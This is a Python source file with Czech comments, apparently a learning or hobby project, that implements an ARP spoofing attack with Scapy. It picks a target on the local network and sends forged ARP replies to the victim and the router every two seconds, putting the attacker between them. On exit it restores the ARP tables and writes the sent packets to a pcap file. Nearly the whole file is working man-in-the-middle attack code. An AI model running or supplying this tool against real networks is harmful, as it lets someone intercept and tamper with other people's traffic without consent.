# spoofer_logic.py - TODO LIST

# 1. TODO: Importovat Scapy (ARP, send, wrpcap)

# 2. TODO: Funkce spoof(target_ip, spoof_ip, target_mac)
#    - Vytvořit falešný ARP paket typu "is-at".
#    - Nastavit psrc na IP routeru, ale odeslat ho na MAC oběti.

# 3. TODO: Funkce restore(target_ip, gateway_ip, target_mac, gateway_mac)
#    - Pošle správné ARP údaje oběti i routeru.
#    - Tím se síť "uzdraví", až vypnete program.

# 4. TODO: Funkce save_capture(packet_list, filename="capture.pcap")
#    - Použít wrpcap() k uložení nasbíraných dat.
from scapy.all import ARP, wrpcap, send as s
import time
from .network_utils import select_target, router_ip, router_mac

# --- Config --- #

target_ip, target_mac = select_target() 

# Vytvoření falešného ARP paketu pro oběť
arp_obet = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
arp_router = ARP(op=2, psrc=target_ip, pdst=router_ip, hwdst=router_mac)

# Restore tabulek
arp_obet_restore = ARP(op=2, psrc=router_ip, hwsrc=router_mac, pdst=target_ip, hwdst=target_mac)
arp_router_restore = ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=router_ip, hwdst=router_mac)

# Seznam na uložení paketů
packet_list = []

# --- Funkce --- #
def save_capture(packets, filename="capture.pcap"):
    """Uloží seznam paketů do .pcap souboru"""
    if packets:
        wrpcap(filename, packets)
        print(f"Komunikace uložena do: {filename} ({len(packets)} paketů)")
    else:
        print("Žádné pakety k uložení.")


# --- Hlavní funkce --- #
def spoof():
    # Odeslání ARP paketů
    try: 
        print(f"Posílám falešné ARP pakety: Ctrl+C pro ukončení.")
        while True:
            s(arp_obet, verbose=False)
            packet_list.append(arp_obet)
            
            s(arp_router, verbose=False)
            packet_list.append(arp_router)
            
            time.sleep(2)

    except KeyboardInterrupt:   
        print("Ukončuji útok, vracím síť do normálu...")
        # Odeslání správných ARP paketů pro obnovení sítě
        s(arp_obet_restore, verbose=False, count=5)
        packet_list.append(arp_obet_restore)
        
        s(arp_router_restore, verbose=False, count=5)
        packet_list.append(arp_router_restore)

        print("Síť byla obnovena. Program ukončen.")
        
        # Uložení komunikace do .pcap souboru
        save_capture(packet_list)
#test

if __name__ == "__main__":
    spoof()